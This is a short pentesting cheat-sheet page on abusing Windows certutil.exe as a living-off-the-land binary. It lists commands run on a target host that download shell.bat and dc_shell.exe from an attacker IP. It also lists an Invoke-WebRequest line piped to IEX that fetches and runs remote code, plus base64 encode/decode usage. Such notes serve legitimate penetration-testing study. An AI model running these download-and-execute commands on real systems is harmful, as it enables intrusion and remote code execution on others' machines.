---
title: certutil
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - windows
  - lolbas
---
#  certutil
 [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

Import a file: (from a windows target host)

```powershell
certutil.exe -urlcache -split -f http://$ipAtacker:8080/shell.bat shell.bat

certutil.exe -urlcache -split -f http://172.16.8.120:6666/dc_shell.exe dc_shell.exe

Invoke-WebRequest http://172.16.8.120:8765/dc_shell.exe -UseBasicParsing | IEX
```

Encode to base64:

```cmd
certutil -encode file1 encodedfile
```

Decode a file

```cmd
certutil -decode encodedfile file2
```

